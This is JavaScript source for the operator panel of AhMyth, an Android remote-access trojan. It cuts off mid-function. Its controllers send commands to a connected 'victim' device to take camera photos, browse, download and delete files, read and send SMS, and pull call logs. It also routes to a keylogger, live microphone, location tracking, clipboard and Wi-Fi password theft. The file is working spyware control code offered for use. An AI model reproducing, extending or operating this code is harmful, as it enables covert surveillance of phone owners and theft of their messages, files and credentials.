const { remote } = require('electron');
const { ipcRenderer } = require('electron');
var app = angular.module('myappy', ['ngRoute', 'infinite-scroll']);
var fs = require("fs-extra");
var homedir = require('node-homedir');
var path = require("path");

// Fix Constants require path - use path resolution that works in Electron renderer
let CONSTANTS;
try {
    // Try relative path first (works when script is loaded as module)
    CONSTANTS = require('../Constants');
} catch (e) {
    try {
        // Fallback: resolve from app directory using remote
        if (remote && remote.app) {
            const appPath = path.resolve(remote.app.getAppPath(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(appPath);
        } else {
            // Last resort: try resolving from known structure
            const constantsPath = path.resolve(__dirname || process.cwd(), 'app', 'assets', 'js', 'Constants.js');
            CONSTANTS = require(constantsPath);
        }
    } catch (e2) {
        console.error('Failed to load Constants:', e2);
        // Create a minimal fallback to prevent complete failure
        CONSTANTS = {
            order: 'order',
            orders: {
                camera: 'x0000ca',
                fileManager: 'x0000fm',
                calls: 'x0000cl',
                sms: 'x0000sm',
                mic: 'x0000mc',
                location: 'x0000lm',
                contacts: 'x0000cn',
                deviceInfo: 'x0000di',
                apps: 'x0000ap',
                clipboard: 'x0000cb',
                wifi: 'x0000wf',
                screen: 'x0000sc'
            },
            logStatus: { SUCCESS: 1, FAIL: 0, INFO: 2, WARNING: 3 },
            logColors: { RED: "red", GREEN: "lime", ORANGE: "orange", YELLOW: "yellow", DEFAULT: "#82eefd" },
            dataDir: 'AhMyth',
            downloadPath: 'Downloads',
            outputApkPath: 'Output'
        };
    }
}

var ORDER = CONSTANTS.order;
var originalSocket = remote.getCurrentWebContents().victim;

var dataPath = path.join(homedir(), CONSTANTS.dataDir);
var downloadsPath = path.join(dataPath, CONSTANTS.downloadPath);
var outputPath = path.join(dataPath, CONSTANTS.outputApkPath);
var logPath = path.join(dataPath, 'Logs');
var db;
try {
    // Try to load database module
    const dbPath = path.resolve(__dirname, '../Database.js');
    if (fs.existsSync(dbPath)) {
        db = require(dbPath);
        console.log('[AhMyth] Database module loaded');
    } else {
        console.warn('[AhMyth] Database module not found at:', dbPath);
    }
} catch (e) {
    console.error('[AhMyth] Failed to load database:', e);
}

// Ensure log directory exists
if (!fs.existsSync(logPath)) {
    fs.mkdirSync(logPath, { recursive: true });
}

// Debug log file
var debugLogFile = path.join(logPath, `debug-${new Date().toISOString().split('T')[0]}.log`);

// Store reference to Angular scope for UI logging (set later by controller)
var labScope = null;
var rootScope = null;

// Set the scope reference from controller
function setLabScope(scope, root) {
    labScope = scope;
    rootScope = root;
}

// Log to file function AND to UI Activity Log
function logToFile(type, command, data) {
    const timestamp = new Date().toISOString();
    const dataStr = typeof data === 'object' ? JSON.stringify(data, null, 2) : String(data || '');
    const truncatedData = dataStr.length > 5000 ? dataStr.substring(0, 5000) + '\n...[truncated]' : dataStr;
    const logEntry = `\n[${timestamp}] [${type}] ${command}\n${'='.repeat(60)}\n${truncatedData}\n`;
    
    try {
        fs.appendFileSync(debugLogFile, logEntry);
    } catch (e) {
        console.error('Error writing to debug log:', e);
    }
    
    // Log to console
    console.log(`[AhMyth ${type}] ${command}:`, dataStr.substring(0, 500));
    
    // Log to SQLite DB
    if (db) {
        try {
            db.log(type, command, dataStr.includes('"error"') ? 'FAIL' : 'SUCCESS');
        } catch (e) {
            console.error('DB Log Error:', e);
        }
    }
    
    // Log to UI Activity Log panel
    if (rootScope && rootScope.Log) {
        const shortData = dataStr.length > 100 ? dataStr.substring(0, 100) + '...' : dataStr;
        if (type === 'REQUEST') {
            rootScope.Log(`[→ REQ] ${command}: ${shortData}`, CONSTANTS.logStatus.INFO);
        } else if (type === 'RESPONSE') {
            // Check if response indicates success or error
            if (dataStr.includes('"error"') || dataStr.includes('"success":false')) {
                rootScope.Log(`[← RES] ${command}: ${shortData}`, CONSTANTS.logStatus.FAIL);
            } else {
                rootScope.Log(`[← RES] ${command}: ${shortData}`, CONSTANTS.logStatus.SUCCESS);
            }
        }
        // Trigger Angular digest if needed
        try {
            if (rootScope && !rootScope.$$phase) {
                rootScope.$apply();
            }
        } catch (e) {}
    }
}

// Track registered listeners to avoid double-registration
var registeredListeners = {};

// Wrap socket with logging - improved version that tracks listeners
var socket = {
    emit: function(event, data) {
        logToFile('REQUEST', event, data);
        if (labScope) labScope.packetCount++;
        return originalSocket.emit(event, data);
    },
    on: function(event, callback) {
        // Track registration to prevent duplicate listeners
        if (registeredListeners[event]) {
            console.log(`[AhMyth] Listener already registered for ${event}, replacing...`);
            originalSocket.removeAllListeners(event);
        }
        registeredListeners[event] = true;
        
        return originalSocket.on(event, function(data) {
            logToFile('RESPONSE', event, data);
            if (labScope) labScope.packetCount++;
            try {
                callback(data);
            } catch (e) {
                console.error(`[AhMyth] Error in callback for ${event}:`, e);
                if (rootScope && rootScope.Log) {
                    rootScope.Log(`[✗] Error processing ${event}: ${e.message}`, CONSTANTS.logStatus.FAIL);
                }
            }
        });
    },
    removeAllListeners: function(event) {
        delete registeredListeners[event];
        return originalSocket.removeAllListeners(event);
    },
    connected: function() {
        return originalSocket && originalSocket.connected;
    }
};

// Export setLabScope for controller access
window.setLabScope = setLabScope;

//-----------------------Routing Config------------------------
app.config(function ($routeProvider, $locationProvider) {
    // Configure location provider for hash-based routing (works better in Electron)
    $locationProvider.hashPrefix('');
    
    $routeProvider
        .when("/", {
            templateUrl: "views/main.html"
        })
        .when("/camera", {
            templateUrl: "views/camera.html",
            controller: "CamCtrl"
        })
        .when("/fileManager", {
            templateUrl: "views/fileManager.html",
            controller: "FmCtrl"
        })
        .when("/smsManager", {
            templateUrl: "views/smsManager.html",
            controller: "SMSCtrl"
        })
        .when("/callsLogs", {
            templateUrl: "views/callsLogs.html",
            controller: "CallsCtrl"
        })
        .when("/contacts", {
            templateUrl: "views/contacts.html",
            controller: "ContCtrl"
        })
        .when("/mic", {
            templateUrl: "views/mic.html",
            controller: "MicCtrl"
        })
        .when("/location", {
            templateUrl: "views/location.html",
            controller: "LocCtrl"
        })
        .when("/deviceInfo", {
            templateUrl: "views/deviceInfo.html",
            controller: "DeviceInfoCtrl"
        })
        .when("/apps", {
            templateUrl: "views/apps.html",
            controller: "AppsCtrl"
        })
        .when("/clipboard", {
            templateUrl: "views/clipboard.html",
            controller: "ClipboardCtrl"
        })
        .when("/wifi", {
            templateUrl: "views/wifi.html",
            controller: "WiFiCtrl"
        })
        .when("/screen", {
            templateUrl: "views/screen.html",
            controller: "ScreenCtrl"
        })
        .when("/keylogger", {
            templateUrl: "views/keylogger.html",
            controller: "KeyloggerCtrl"
        })
        .when("/browserHistory", {
            templateUrl: "views/browserHistory.html",
            controller: "BrowserHistoryCtrl"
        })
        .when("/notifications", {
            templateUrl: "views/notifications.html",
            controller: "NotificationsCtrl"
        })
        .when("/systemInfo", {
            templateUrl: "views/systemInfo.html",
            controller: "SystemInfoCtrl"
        })
        .when("/makeCall", {
            templateUrl: "views/makeCall.html",
            controller: "MakeCallCtrl"
        })
        .when("/liveMic", {
            templateUrl: "views/liveMic.html",
            controller: "LiveMicCtrl"
        })
        .when("/wifiPasswords", {
            templateUrl: "views/wifiPasswords.html",
            controller: "WiFiPasswordsCtrl"
        })
        .otherwise({
            redirectTo: '/'
        });
});



//-----------------------LAB Controller (lab.htm)------------------------
// controller for Lab.html and its views mic.html,camera.html..etc
app.controller("LabCtrl", function ($scope, $rootScope, $location, $route, $interval) {
    $labCtrl = $scope;
    $labCtrl.logs = [];
    $labCtrl.isConnected = true; // Start as connected since lab opens on connection
    $labCtrl.sessionId = Date.now().toString(36).toUpperCase();
    $labCtrl.uptime = '00:00:00';
    $labCtrl.packetCount = 0;
    
    // Enable UI logging by setting scope reference
    if (window.setLabScope) {
        window.setLabScope($scope, $rootScope);
        console.log('[AhMyth Lab] UI logging enabled');
    }
    
    var startTime = Date.now();
    
    // Update uptime every second
    $interval(() => {
        var elapsed = Math.floor((Date.now() - startTime) / 1000);
        var hours = Math.floor(elapsed / 3600);
        var minutes = Math.floor((elapsed % 3600) / 60);
        var seconds = elapsed % 60;
        $labCtrl.uptime = String(hours).padStart(2, '0') + ':' + 
                         String(minutes).padStart(2, '0') + ':' + 
                         String(seconds).padStart(2, '0');
    }, 1000);
    
    // Track connection by checking socket state directly
    $interval(() => {
        try {
            // Check if the original socket is connected
            if (originalSocket && originalSocket.connected) {
                if (!$labCtrl.isConnected) {
                    $labCtrl.isConnected = true;
                    $rootScope.Log('[✓] Connection active', CONSTANTS.logStatus.SUCCESS);
                }
            } else {
                if ($labCtrl.isConnected) {
                    $labCtrl.isConnected = false;
                    $rootScope.Log('[⚠] Connection lost', CONSTANTS.logStatus.WARNING);
                }
            }
        } catch (e) {
            // Socket check failed
        }
    }, 3000);

    // Wait for DOM to be ready and initialize routing
    setTimeout(() => {
        var log = document.getElementById("logy");
        if (!log) {
            console.error("[AhMyth Lab] Logy element not found!");
        }
        
        // Ensure routing is initialized - navigate to default route if no route is set
        if ($location.path() === '' || $location.path() === '/') {
            $location.path('/');
            $scope.$apply();
        }
        
        console.log('[AhMyth Lab] Controller initialized, current path:', $location.path());
    }, 100);

    // Handle remote module with fallback
    let electronWindow;
    try {
        electronWindow = remote.getCurrentWindow();
    } catch (e) {
        console.error("[AhMyth Lab] Remote module not available:", e);
        electronWindow = null;
    }

    $labCtrl.close = () => {
        if (electronWindow) {
            electronWindow.close();
        } else {
            ipcRenderer.send('window-close');
        }
    };

    $labCtrl.minimize = () => {
        if (electronWindow) {
            electronWindow.minimize();
        } else {
            ipcRenderer.send('window-minimize');
        }
    };

    $labCtrl.maximize = () => {
        if (electronWindow) {
            if (electronWindow.isMaximized()) {
                electronWindow.unmaximize(); // Restore the window size
            } else {
                electronWindow.maximize(); // Maximize the window
            }
        } else {
            ipcRenderer.send('window-maximize');
        }
    };

    // Global permission request function - available to all controllers
    $rootScope.requestPermission = (permissionType) => {
        const permOrder = CONSTANTS.orders.requestPermission || 'x0000rp';
        $rootScope.Log(`[→] Requesting ${permissionType} permission on device...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: permOrder, permission: permissionType });
    };

    // Wake screen function - wakes up device and attempts to unlock
    $labCtrl.wakeScreen = () => {
        $rootScope.Log('[→] Sending wake screen command...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: 'x0000wk' });
    };
    
    // Listen for wake response
    socket.on('x0000wk', (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] ${data.message || 'Screen woken up'}`, CONSTANTS.logStatus.SUCCESS);
        } else {
            $rootScope.Log(`[✗] Wake failed: ${data.error || 'Unknown error'}`, CONSTANTS.logStatus.FAIL);
        }
    });
    
    // Listen for permission request responses
    socket.on('x0000rp', (data) => {
        if (data.success) {
            $rootScope.Log(`[✓] Permission dialog shown: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
        } else if (data.error) {
            $rootScope.Log(`[✗] Permission error: ${data.error}`, CONSTANTS.logStatus.FAIL);
        } else if (data.granted === true) {
            $rootScope.Log(`[✓] Permission GRANTED by user: ${data.permission}`, CONSTANTS.logStatus.SUCCESS);
            // Broadcast event for controllers to retry action
            $rootScope.$broadcast('PermissionGranted', data.permission);
        } else if (data.granted === false) {
             $rootScope.Log(`[✗] Permission DENIED by user: ${data.permission}`, CONSTANTS.logStatus.FAIL);
        }
        if (!$rootScope.$$phase) {
            $rootScope.$apply();
        }
    });

    // Enhanced logging with timestamps
    $rootScope.Log = (msg, status) => {
        var fontColor = CONSTANTS.logColors.DEFAULT;
        if (status == CONSTANTS.logStatus.SUCCESS)
            fontColor = CONSTANTS.logColors.GREEN;
        else if (status == CONSTANTS.logStatus.FAIL)
            fontColor = CONSTANTS.logColors.RED;
        else if (status == CONSTANTS.logStatus.INFO)
            fontColor = CONSTANTS.logColors.YELLOW;
        else if (status == CONSTANTS.logStatus.WARNING)
            fontColor = CONSTANTS.logColors.ORANGE;

        const now = new Date();
        const timestamp = now.toLocaleString('en-US', {
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
            hour12: false
        });

        $labCtrl.logs.push({ 
            date: `[${timestamp}]`, 
            msg: msg, 
            color: fontColor 
        });
        
        // Ensure log element exists before scrolling
        setTimeout(() => {
            var log = document.getElementById("logy");
            if (log) {
                log.scrollTop = log.scrollHeight;
            }
        }, 0);
        
        if (!$labCtrl.$$phase) {
            $labCtrl.$apply();
        }
    }

    //fired when notified from Main Proccess (main.js) about
    // this victim who disconnected
    ipcRenderer.on('SocketIO:VictimDisconnected', (event) => {
        $rootScope.Log('[✗] Victim disconnected', CONSTANTS.logStatus.FAIL);
    });


    //fired when notified from the Main Process (main.js) about
    // the Server disconnection
    ipcRenderer.on('SocketIO:ServerDisconnected', (event) => {
        $rootScope.Log('[⚠] Server disconnected', CONSTANTS.logStatus.WARNING);
    });




    // Refresh current view data
    $labCtrl.refreshData = () => {
        $rootScope.Log('[→] Refreshing data...', CONSTANTS.logStatus.INFO);
        $route.reload();
    };

    // to move from view to another
    $labCtrl.goToPage = (page) => {
        try {
            const path = '/' + page;
            console.log('[AhMyth Lab] Navigating to:', path);
            $labCtrl.packetCount++;
            $location.path(path);
            if (!$scope.$$phase && !$scope.$root.$$phase) {
                $scope.$apply();
            }
        } catch (error) {
            console.error('[AhMyth Lab] Navigation error:', error);
            $rootScope.Log(`[✗] Failed to navigate to ${page}`, CONSTANTS.logStatus.FAIL);
        }
    }
    
    // Handle route change errors
    $scope.$on('$routeChangeError', function(event, current, previous, rejection) {
        console.error('[AhMyth Lab] Route change error:', rejection);
        $rootScope.Log('[✗] Failed to load view: ' + (rejection || 'Unknown error'), CONSTANTS.logStatus.FAIL);
    });
    
    // Handle successful route changes
    $scope.$on('$routeChangeSuccess', function(event, current, previous) {
        if (current && current.$$route) {
            console.log('[AhMyth Lab] Route changed to:', current.$$route.originalPath);
        }
    });





});






//-----------------------Camera Controller (camera.htm)------------------------
// camera controller
app.controller("CamCtrl", function ($scope, $rootScope, $timeout) {
    $camCtrl = $scope;
    $camCtrl.isSaveShown = false;
    $camCtrl.cameras = [];
    $camCtrl.selectedCam = null;
    $camCtrl.imgUrl = null;
    $camCtrl.load = '';
    $camCtrl.lastError = null;
    var camera = CONSTANTS.orders.camera;
    var currentBase64 = null;
    var responseTimeout = null;

    // remove socket listener
    $camCtrl.$on('$destroy', () => {
        socket.removeAllListeners(camera);
        if (responseTimeout) $timeout.cancel(responseTimeout);
    });

    // Check socket connection before sending commands
    function checkConnection() {
        if (!originalSocket || !originalSocket.connected) {
            $rootScope.Log('[✗] Not connected to device!', CONSTANTS.logStatus.FAIL);
            $camCtrl.load = '';
            $camCtrl.lastError = 'Device not connected';
            return false;
        }
        return true;
    }

    // Set timeout for response
    function setResponseTimeout(action, timeoutMs) {
        if (responseTimeout) $timeout.cancel(responseTimeout);
        responseTimeout = $timeout(() => {
            if ($camCtrl.load === 'loading') {
                $camCtrl.load = '';
                $camCtrl.lastError = `No response from device for ${action}. Check if permissions are granted.`;
                $rootScope.Log(`[⚠] Timeout waiting for ${action} response. Device may need camera permission.`, CONSTANTS.logStatus.WARNING);
            }
        }, timeoutMs || 30000);
    }

    // Select camera
    $camCtrl.selectCamera = (cam) => {
        $camCtrl.selectedCam = cam;
        $camCtrl.lastError = null;
        $rootScope.Log(`[ℹ] Selected: ${cam.name || (cam.id == 0 ? 'Back Camera' : 'Front Camera')}`, CONSTANTS.logStatus.INFO);
    };

    // Take picture
    $camCtrl.snap = () => {
        if (!checkConnection()) return;
        
        if (!$camCtrl.selectedCam) {
            $rootScope.Log('[⚠] Please select a camera first', CONSTANTS.logStatus.WARNING);
            return;
        }
        $camCtrl.load = 'loading';
        $camCtrl.lastError = null;
        $rootScope.Log(`[→] Taking picture with camera ID: ${$camCtrl.selectedCam.id}...`, CONSTANTS.logStatus.INFO);
        setResponseTimeout('camera capture', 30000);
        socket.emit(ORDER, { order: camera, extra: String($camCtrl.selectedCam.id) });
    };

    // Save photo
    $camCtrl.savePhoto = () => {
        if (!currentBase64) return;
        $rootScope.Log('[→] Saving picture...', CONSTANTS.logStatus.INFO);
        var picPath = path.join(downloadsPath, Date.now() + ".jpg");
        fs.outputFile(picPath, Buffer.from(currentBase64, "base64"), (err) => {
            if (!err)
                $rootScope.Log(`[✓] Picture saved: ${picPath}`, CONSTANTS.logStatus.SUCCESS);
            else
                $rootScope.Log('[✗] Failed to save picture', CONSTANTS.logStatus.FAIL);
        });
    };

    // Fullscreen - open in new window
    $camCtrl.fullscreen = () => {
        if ($camCtrl.imgUrl) {
            let win = window.open();
            win.document.write('<img src="' + $camCtrl.imgUrl + '" style="max-width:100%;height:auto;">');
        }
    };

    // Bring app to foreground
    $camCtrl.bringToForeground = () => {
        if (!checkConnection()) return;
        $rootScope.Log('[→] Bringing app to foreground...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: CONSTANTS.orders.foreground, extra: 'foreground' });
    };

    // Send app to background
    $camCtrl.sendToBackground = () => {
        if (!checkConnection()) return;
        $rootScope.Log('[→] Sending app to background...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: CONSTANTS.orders.foreground, extra: 'background' });
    };

    // Socket handler - improved with error handling
    socket.on(camera, (data) => {
        if (responseTimeout) $timeout.cancel(responseTimeout);
        $camCtrl.load = '';
        $camCtrl.lastError = null;
        
        console.log('[CamCtrl] Received camera data:', data);
        
        // Handle error responses
        if (data.error) {
            $camCtrl.lastError = data.error;
            $rootScope.Log(`[✗] Camera error: ${data.error}`, CONSTANTS.logStatus.FAIL);
            $camCtrl.$apply();
            return;
        }
        
        if (data.camList == true) {
            $rootScope.Log(`[✓] Found ${data.list.length} camera(s)`, CONSTANTS.logStatus.SUCCESS);
            $camCtrl.cameras = data.list;
            // Auto-select first camera
            if (data.list.length > 0) {
                $camCtrl.selectedCam = data.list[0];
            }
            $camCtrl.$apply();
        } else if (data.image == true) {
            $rootScope.Log('[✓] Picture captured', CONSTANTS.logStatus.SUCCESS);
            
            // Handle buffer data
            if (data.buffer) {
                try {
                    var uint8Arr = new Uint8Array(data.buffer);
                    var binary = '';
                    for (var i = 0; i < uint8Arr.length; i++) {
                        binary += String.fromCharCode(uint8Arr[i]);
                    }
                    currentBase64 = window.btoa(binary);
                    
                    $camCtrl.imgUrl = 'data:image/jpeg;base64,' + currentBase64;
                    $camCtrl.isSaveShown = true;
                    $rootScope.Log(`[✓] Image received: ${Math.round(uint8Arr.length/1024)} KB`, CONSTANTS.logStatus.SUCCESS);
                } catch (e) {
                    console.error('[CamCtrl] Error processing image:', e);
                    $camCtrl.lastError = 'Error processing image data';
                    $rootScope.Log(`[✗] Error processing image: ${e.message}`, CONSTANTS.logStatus.FAIL);
                }
            } else {
                $camCtrl.lastError = 'No image buffer in response';
                $rootScope.Log('[✗] No image buffer received', CONSTANTS.logStatus.FAIL);
            }
            $camCtrl.$apply();
        } else if (data.image == false) {
            // Explicit failure
            $camCtrl.lastError = data.error || 'Camera capture failed';
            $rootScope.Log(`[✗] Camera capture failed: ${data.error || 'Unknown error'}`, CONSTANTS.logStatus.FAIL);
            $camCtrl.$apply();
        }
    });

    // Initial load - get camera list with connection check
    if (checkConnection()) {
        $rootScope.Log('[→] Fetching camera list...', CONSTANTS.logStatus.INFO);
        $camCtrl.load = 'loading';
        setResponseTimeout('camera list', 15000);
        socket.emit(ORDER, { order: camera, extra: 'camList' });
    }
});






//-----------------------File Controller (fileManager.htm)------------------------
// File controller
app.controller("FmCtrl", function ($scope, $rootScope) {
    $fmCtrl = $scope;
    $fmCtrl.load = 'loading';
    $fmCtrl.files = [];
    $fmCtrl.currentPath = '/storage/emulated/0';
    $fmCtrl.pathHistory = [];
    $fmCtrl.canGoBack = false;
    $fmCtrl.pathParts = [];
    $fmCtrl.folderCount = 0;
    $fmCtrl.fileCount = 0;
    $fmCtrl.totalSize = 0;
    var fileManager = CONSTANTS.orders.fileManager;

    // remove socket listener
    $fmCtrl.$on('$destroy', () => {
        socket.removeAllListeners(fileManager);
    });

    // infinite scrolling
    $fmCtrl.barLimit = 50;
    $fmCtrl.increaseLimit = () => {
        $fmCtrl.barLimit += 50;
    };

    // Update path parts for breadcrumb
    function updatePathParts(path) {
        $fmCtrl.pathParts = [];
        if (!path || path === '/') return;
        
        let parts = path.split('/').filter(p => p);
        let currentPath = '';
        parts.forEach(part => {
            currentPath += '/' + part;
            $fmCtrl.pathParts.push({ name: part, path: currentPath });
        });
    }

    // Update file stats
    function updateStats() {
        $fmCtrl.folderCount = $fmCtrl.files.filter(f => f.isDir).length;
        $fmCtrl.fileCount = $fmCtrl.files.filter(f => !f.isDir).length;
        $fmCtrl.totalSize = $fmCtrl.files.reduce((acc, f) => acc + (f.size || 0), 0);
    }

    // Format file size
    $fmCtrl.formatSize = (bytes) => {
        if (!bytes || bytes === 0) return '0 B';
        const sizes = ['B', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(1024));
        return (bytes / Math.pow(1024, i)).toFixed(1) + ' ' + sizes[i];
    };

    // Navigate to path
    $fmCtrl.goToPath = (path) => {
        if (path) {
            $fmCtrl.pathHistory.push($fmCtrl.currentPath);
            $fmCtrl.canGoBack = true;
            $fmCtrl.currentPath = path;
            $fmCtrl.load = 'loading';
            $fmCtrl.barLimit = 50;
            updatePathParts(path);
            $rootScope.Log(`[→] Opening: ${path}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: path });
        }
    };

    // Go back
    $fmCtrl.goBack = () => {
        if ($fmCtrl.pathHistory.length > 0) {
            let prevPath = $fmCtrl.pathHistory.pop();
            $fmCtrl.canGoBack = $fmCtrl.pathHistory.length > 0;
            $fmCtrl.currentPath = prevPath;
            $fmCtrl.load = 'loading';
            $fmCtrl.barLimit = 50;
            updatePathParts(prevPath);
            $rootScope.Log(`[→] Going back to: ${prevPath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'ls', path: prevPath });
        }
    };

    // Go home
    $fmCtrl.goHome = () => {
        $fmCtrl.pathHistory = [];
        $fmCtrl.canGoBack = false;
        $fmCtrl.goToPath('/storage/emulated/0');
    };

    // Refresh current directory
    $fmCtrl.refreshDir = () => {
        $fmCtrl.load = 'loading';
        $fmCtrl.barLimit = 50;
        $rootScope.Log(`[→] Refreshing: ${$fmCtrl.currentPath}`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
    };

    // Copy path to clipboard
    $fmCtrl.copyPath = () => {
        if (navigator.clipboard) {
            navigator.clipboard.writeText($fmCtrl.currentPath);
            $rootScope.Log('[✓] Path copied to clipboard', CONSTANTS.logStatus.SUCCESS);
        }
    };

    // When folder/file is clicked - handles both path string and file object
    $fmCtrl.getFiles = (itemOrPath) => {
        let targetPath;
        
        if (typeof itemOrPath === 'string') {
            // Direct path string (from quick access or breadcrumb)
            targetPath = itemOrPath;
        } else if (itemOrPath && typeof itemOrPath === 'object') {
            // File object
            if (!itemOrPath.isDir) return; // Only navigate into folders
            targetPath = itemOrPath.path || ($fmCtrl.currentPath + '/' + itemOrPath.name);
        } else {
            return;
        }
        
        if (targetPath) {
            $fmCtrl.goToPath(targetPath);
        }
    };
    
    // Open folder - wrapper for consistency
    $fmCtrl.openFolder = (file) => {
        if (file && file.isDir) {
            let targetPath = file.path || ($fmCtrl.currentPath + '/' + file.name);
            $fmCtrl.goToPath(targetPath);
        }
    };

    // Save/download file
    $fmCtrl.saveFile = (filePath) => {
        $rootScope.Log(`[→] Downloading: ${filePath}`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: fileManager, extra: 'dl', path: filePath });
    };

    // Delete file/folder
    $fmCtrl.deleteFile = (filePath, fileName) => {
        if (confirm(`Are you sure you want to delete "${fileName}"?`)) {
            $rootScope.Log(`[→] Deleting: ${filePath}`, CONSTANTS.logStatus.INFO);
            socket.emit(ORDER, { order: fileManager, extra: 'delete', path: filePath });
        }
    };

    // Socket handler
    socket.on(fileManager, (data) => {
        if (data.deleted !== undefined) {
            // Delete response
            if (data.deleted) {
                $rootScope.Log(`[✓] Deleted: ${data.path}`, CONSTANTS.logStatus.SUCCESS);
                // Refresh current directory
                socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
            } else {
                $rootScope.Log(`[✗] Failed to delete: ${data.path}`, CONSTANTS.logStatus.FAIL);
            }
        } else if (data.file == true) {
            // File download response
            $rootScope.Log('[→] Downloading file...', CONSTANTS.logStatus.INFO);
            var filePath = path.join(downloadsPath, data.name);
            fs.outputFile(filePath, data.buffer, (err) => {
                if (err)
                    $rootScope.Log('[✗] Failed to save file', CONSTANTS.logStatus.FAIL);
                else
                    $rootScope.Log(`[✓] File saved: ${filePath}`, CONSTANTS.logStatus.SUCCESS);
            });
        } else if (Array.isArray(data) && data.length > 0) {
            // Directory listing response
            $rootScope.Log(`[✓] Found ${data.length} items`, CONSTANTS.logStatus.SUCCESS);
            $fmCtrl.load = '';
            $fmCtrl.files = data.sort((a, b) => {
                // Folders first, then alphabetical
                if (a.isDir && !b.isDir) return -1;
                if (!a.isDir && b.isDir) return 1;
                return (a.name || '').localeCompare(b.name || '');
            });
            updateStats();
            $fmCtrl.$apply();
        } else {
            $rootScope.Log('[⚠] Directory empty or access denied', CONSTANTS.logStatus.WARNING);
            $fmCtrl.load = '';
            $fmCtrl.files = [];
            updateStats();
            $fmCtrl.$apply();
        }
    });

    // Initial load
    $rootScope.Log('[→] Loading file manager...', CONSTANTS.logStatus.INFO);
    updatePathParts($fmCtrl.currentPath);
    socket.emit(ORDER, { order: fileManager, extra: 'ls', path: $fmCtrl.currentPath });
});








//-----------------------SMS Controller (sms.htm)------------------------
// SMS controller
app.controller("SMSCtrl", function ($scope, $rootScope) {
    $SMSCtrl = $scope;
    var sms = CONSTANTS.orders.sms;
    $SMSCtrl.smsList = [];
    $('.menu .item')
        .tab();

    $SMSCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(sms);
    });


    // send request to victim to bring all sms
    $SMSCtrl.getSMSList = () => {
        $SMSCtrl.load = 'loading';
        $SMSCtrl.barLimit = 50;
        $rootScope.Log('[→] Fetching SMS list...', CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'ls' });
    }

    $SMSCtrl.increaseLimit = () => {
        $SMSCtrl.barLimit += 50;
    }

    // send request to victim to send sms
    $SMSCtrl.SendSMS = (phoneNo, msg) => {
        $rootScope.Log(`[→] Sending SMS to ${phoneNo}...`, CONSTANTS.logStatus.INFO);
        socket.emit(ORDER, { order: sms, extra: 'sendSMS', to: phoneNo, sms: msg });
    }

    // save sms list to csv file
    $SMSCtrl.SaveSMS = () => {

        if ($SMSCtrl.smsList.length == 0)
            return;


        var csvRows = [];
        for (var i = 0; i < $SMSCtrl.smsList.length; i++) {
            csvRows.push($SMSCtrl.smsList[i].phoneNo + "," + $SMSCtrl.smsList[i].msg);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "SMS_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving SMS list...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
                $rootScope.Log(`[✓] SMS list saved: ${csvPath}`, CONSTANTS.logStatus.SUCCESS);

        });

    }


    //listening for victim response
    socket.on(sms, (data) => {
        if (data.smsList) {
            $SMSCtrl.load = '';
            $rootScope.Log(`[✓] SMS list received: ${data.smsList.length} messages`, CONSTANTS.logStatus.SUCCESS);
            $SMSCtrl.smsList = data.smsList;
            $SMSCtrl.smsSize = data.smsList.length;
            
            // Save to DB
            if (db) {
                try {
                    db.saveSMS(data.smsList);
                } catch (e) { console.error(e); }
            }
            
            $SMSCtrl.$apply();
        } else {
            if (data == true) {
                $rootScope.Log('[✓] SMS sent successfully', CONSTANTS.logStatus.SUCCESS);
                // Refresh list to show sent message
                setTimeout(() => {
                    $SMSCtrl.getSMSList();
                }, 1000);
            } else {
                $rootScope.Log('[✗] Failed to send SMS', CONSTANTS.logStatus.FAIL);
            }
        }
    });



});










//-----------------------Calls Controller (callslogs.htm)------------------------
// Calls controller
app.controller("CallsCtrl", function ($scope, $rootScope) {
    $CallsCtrl = $scope;
    $CallsCtrl.callsList = [];
    var calls = CONSTANTS.orders.calls;

    $CallsCtrl.$on('$destroy', () => {
        // release resources, cancel Listner...
        socket.removeAllListeners(calls);
    });

    $CallsCtrl.load = 'loading';
    $rootScope.Log('[→] Fetching call logs...', CONSTANTS.logStatus.INFO);
    socket.emit(ORDER, { order: calls });


    $CallsCtrl.barLimit = 50;
    $CallsCtrl.increaseLimit = () => {
        $CallsCtrl.barLimit += 50;
    }


    $CallsCtrl.SaveCalls = () => {
        if ($CallsCtrl.callsList.length == 0)
            return;

        var csvRows = [];
        for (var i = 0; i < $CallsCtrl.callsList.length; i++) {
            var type = (($CallsCtrl.callsList[i].type) == 1 ? "INCOMING" : "OUTGOING");
            var name = (($CallsCtrl.callsList[i].name) == null ? "Unknown" : $CallsCtrl.callsList[i].name);
            csvRows.push($CallsCtrl.callsList[i].phoneNo + "," + name + "," + $CallsCtrl.callsList[i].duration + "," + type);
        }

        var csvStr = csvRows.join("\n");
        var csvPath = path.join(downloadsPath, "Calls_" + Date.now() + ".csv");
        $rootScope.Log("[→] Saving call logs...", CONSTANTS.logStatus.INFO);
        fs.outputFile(csvPath, csvStr, (error) => {
            if (error)
                $rootScope.Log(`[✗] Failed to save: ${csvPath}`, CONSTANTS.logStatus.FAIL);
            else
